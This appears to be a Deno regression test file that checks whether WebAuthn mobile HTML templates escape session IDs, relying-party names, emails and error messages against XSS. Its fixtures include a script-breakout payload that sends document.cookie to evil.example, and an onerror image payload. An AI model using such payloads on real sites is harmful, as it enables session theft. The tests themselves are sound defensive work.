/**
 * Regression coverage for the mobile WebAuthn HTML templates.
 *
 * challenge/email are constrained upstream (email format, a base64url
 * challenge matched against a stored row) before reaching these templates,
 * but sessionId and rpName (registration) are plain, unconstrained query
 * parameters that are echoed straight into the returned page - into both
 * HTML text and inline <script> string literals - with no character
 * restriction. An attacker who knows a victim's email can obtain a real
 * challenge/credentialId for that account from the public challenge-issuing
 * endpoint, then craft a sessionId/rpName that breaks out of its context to
 * run arbitrary JavaScript on the trusted api.risaboss.com origin, inside a
 * page that also runs a real WebAuthn ceremony for the victim's own passkey.
 *
 * These tests assert the escaping actually closes both injection contexts:
 * HTML text (email, credential display name, error message) and inline
 * <script> string literals (challenge, userId, email, sessionId, rpId,
 * rpName, credentialId).
 */

import { assertEquals, assertStringIncludes } from "jsr:@std/assert"
import { getMobileRegistrationHTML, getMobileAuthenticationHTML, getMobileErrorHTML } from "../utils/html.ts"

/**
 * Tests run in one process and Deno imports every test module before any
 * test body runs, so the anon key is set per test (as routes.test.ts does)
 * rather than at module top level: a top-level set would leak its value into
 * every other test file for the whole run, and a trailing "cleanup" test
 * never runs under `--filter`.
 */
async function withAnonKey<T>(produce: () => Promise<T>): Promise<T> {
  const previousAnonKey = Deno.env.get("SUPABASE_ANON_KEY")
  Deno.env.set("SUPABASE_ANON_KEY", "test-anon-key")
  try {
    return await produce()
  } finally {
    if (previousAnonKey === undefined) Deno.env.delete("SUPABASE_ANON_KEY")
    else Deno.env.set("SUPABASE_ANON_KEY", previousAnonKey)
  }
}

// A single payload that, left unescaped, would (a) close the surrounding
// single-quoted JS string, (b) run attacker JS via the resulting `; ... ;`,
// and (c) close the surrounding <script> tag entirely via `</script>`.
const SCRIPT_BREAKOUT_PAYLOAD = `x'; fetch('https://evil.example/c?'+document.cookie); //</script><script>alert(1)</script>`
const HTML_BREAKOUT_PAYLOAD = `<img src=x onerror=alert(1)>`

Deno.test({
  name: "getMobileRegistrationHTML - sessionId cannot break out of its JS string literal",
  async fn() {
    const html = await withAnonKey(() => getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "victim@example.com",
      SCRIPT_BREAKOUT_PAYLOAD,
      "api.risaboss.com",
      "BOSS",
    ))

    // The raw payload must never appear verbatim - if it does, it broke out.
    assertEquals(html.includes(SCRIPT_BREAKOUT_PAYLOAD), false)
    // No unescaped "</script>" may appear anywhere except the real closing
    // tags this template itself defines.
    const scriptCloseCount = (html.match(/<\/script>/g) ?? []).length
    assertEquals(scriptCloseCount, 1, "the payload's </script> must not add a second real closing tag")
    // The sessionId assignment must still be a single, intact JS statement:
    // the escaped value, quote-closed, semicolon-terminated, nothing injected after it.
    assertStringIncludes(html, `const sessionId = 'x\\'; fetch(\\'https://evil.example/c?\\'+document.cookie); //\\u003C/script\\u003E\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E';`)
  },
  sanitizeOps: false,
  sanitizeResources: false,
})

Deno.test({
  name: "getMobileRegistrationHTML - rpName cannot break out of its JS string literal",
  async fn() {
    const html = await withAnonKey(() => getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "victim@example.com",
      "session-abc",
      "api.risaboss.com",
      SCRIPT_BREAKOUT_PAYLOAD,
    ))
    assertEquals(html.includes(SCRIPT_BREAKOUT_PAYLOAD), false)
    assertEquals((html.match(/<\/script>/g) ?? []).length, 1)
    // Same exact-statement pin as the sessionId test, for rpName's position
    // in the same script block.
    assertStringIncludes(html, `const rpName = 'x\\'; fetch(\\'https://evil.example/c?\\'+document.cookie); //\\u003C/script\\u003E\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E';`)
  },
  sanitizeOps: false,
  sanitizeResources: false,
})

Deno.test({
  name: "getMobileRegistrationHTML - email is escaped in both the HTML badge and the script",
  async fn() {
    const html = await withAnonKey(() => getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      HTML_BREAKOUT_PAYLOAD,
      "session-abc",
      "api.risaboss.com",
      "BOSS",
    ))
    assertEquals(html.includes(HTML_BREAKOUT_PAYLOAD), false)
    // HTML-text context: entity-escaped.
    assertStringIncludes(html, "&lt;img src=x onerror=alert(1)&gt;")
    // JS-string context: angle brackets neutralized so no literal "<" survives.
    assertEquals(html.includes("<img src=x onerror=alert(1)>"), false)
  },
  sanitizeOps: false,
  sanitizeResources: false,
})

Deno.test({
  name: "getMobileRegistrationHTML - benign values still round-trip correctly (no over-escaping)",
  async fn() {
    const html = await withAnonKey(() => getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "person@example.com",
      "session-abc-123",
      "api.risaboss.com",
      "BOSS Console",
    ))
    assertStringIncludes(html, "<div class=\"value\">person@example.com</div>")
    assertStringIncludes(html, "const sessionId = 'session-abc-123';")
    assertStringIncludes(html, "const rpName = 'BOSS Console';")
  },
  sanitizeOps: false,
  sanitizeResources: false,
})

Deno.test({
  name: "getMobileAuthenticationHTML - sessionId and credentialDisplayName cannot break out",
  async fn() {
    const html = await withAnonKey(() => getMobileAuthenticationHTML(
      "challenge-abc",
      "victim@example.com",
      SCRIPT_BREAKOUT_PAYLOAD,
      "api.risaboss.com",
      "credential-abc",
      HTML_BREAKOUT_PAYLOAD,
      Date.now(),
    ))
    assertEquals(html.includes(SCRIPT_BREAKOUT_PAYLOAD), false)
    assertEquals(html.includes(HTML_BREAKOUT_PAYLOAD), false)
    assertEquals((html.match(/<\/script>/g) ?? []).length, 1)
    assertStringIncludes(html, "&lt;img src=x onerror=alert(1)&gt;")
  },
  sanitizeOps: false,
  sanitizeResources: false,
})

Deno.test({
  name: "getMobileErrorHTML - message is HTML-escaped",
  async fn() {
    const html = await withAnonKey(() => getMobileErrorHTML(HTML_BREAKOUT_PAYLOAD))
    assertEquals(html.includes(HTML_BREAKOUT_PAYLOAD), false)
    assertStringIncludes(html, "&lt;img src=x onerror=alert(1)&gt;")
  },
})

Deno.test({
  name: "dollar replacement patterns are inert in every template",
  async fn() {
    // String.prototype.replace applies `$`-pattern expansion ($$, $&, `` $` ``,
    // $') to *string* replacement values, and that expansion runs after
    // escaping. A `$&` sessionId would echo the raw placeholder back into the
    // page and `` $` `` would splice the entire pre-match document into the
    // string literal, killing the inline script. These values must survive
    // substitution verbatim.
    const reg = await withAnonKey(() => getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "victim@example.com",
      "$&",
      "api.risaboss.com",
      "$$",
    ))
    assertStringIncludes(reg, "const sessionId = '$&';")
    assertStringIncludes(reg, "const rpName = '$$';")
    assertEquals(reg.includes("{{SESSION_ID_JS}}"), false)

    const splice = await withAnonKey(() => getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "victim@example.com",
      "$`",
      "api.risaboss.com",
      "BOSS",
    ))
    assertStringIncludes(splice, "const sessionId = '$`';")
    // the pre-match document must not be spliced into the string literal
    assertEquals((splice.match(/const challenge = 'challenge-abc';/g) ?? []).length, 1)

    const auth = await withAnonKey(() => getMobileAuthenticationHTML(
      "challenge-abc",
      "victim@example.com",
      "$&",
      "api.risaboss.com",
      "credential-abc",
      "$$",
      Date.now(),
    ))
    assertStringIncludes(auth, "const sessionId = '$&';")
    assertStringIncludes(auth, "<span class=\"value\">$$</span>")

    const err = await withAnonKey(() => getMobileErrorHTML("$&"))
    assertEquals(err.includes("{{MESSAGE_HTML}}"), false)
    assertStringIncludes(err, "$&")

    // `$'` completes the set: with a string replacement it would expand to
    // the text after the match.
    const dollarQuote = await withAnonKey(() => getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "victim@example.com",
      "$'",
      "api.risaboss.com",
      "BOSS",
    ))
    assertStringIncludes(dollarQuote, "const sessionId = '$\\'';")
  },
})

Deno.test({
  name: "a backslash before a quote survives intact (the backslash rule runs first)",
  async fn() {
    // Without the backslash-doubling rule - or with it running after the
    // quote rule - this value would escape to a literal that still closes at
    // the first quote and hands the rest of the line to the JS parser.
    const html = await withAnonKey(() => getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "victim@example.com",
      String.raw`x\'; alert(1); //`,
      "api.risaboss.com",
      "BOSS",
    ))
    assertStringIncludes(html, String.raw`const sessionId = 'x\\\'; alert(1); //';`)
  },
})

Deno.test({
  name: "CR and LF in a JS-string value are escaped to two-character sequences",
  async fn() {
    // A raw line break inside a single-line string literal is a syntax
    // error, so it must reach the page as a backslash escape, not as the
    // raw character.
    const html = await withAnonKey(() => getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "victim@example.com",
      "a\nb\r",
      "api.risaboss.com",
      "BOSS",
    ))
    assertStringIncludes(html, "const sessionId = 'a\\nb\\r';")
  },
})

Deno.test({
  name: "escapeHtml escapes the ampersand before other entities",
  async fn() {
    // If "<" were escaped before "&", the "&" introduced by the "<"
    // entity would be escaped a second time and double-escape the value.
    const html = await withAnonKey(() => getMobileAuthenticationHTML(
      "challenge-abc",
      "victim@example.com",
      "session-abc",
      "api.risaboss.com",
      "credential-abc",
      "&<x",
      Date.now(),
    ))
    assertStringIncludes(html, "&amp;&lt;x")
  },
})

Deno.test({
  name: "a value containing a later placeholder name is not expanded",
  async fn() {
    // A single pass over the original template must not re-scan substituted
    // values: a sessionId that literally contains a placeholder name stays
    // literal text instead of being filled in by a later substitution.
    const html = await withAnonKey(() => getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "victim@example.com",
      "{{ANON_KEY_JS}}",
      "api.risaboss.com",
      "BOSS",
    ))
    assertStringIncludes(html, "const sessionId = '{{ANON_KEY_JS}}';")
  },
})
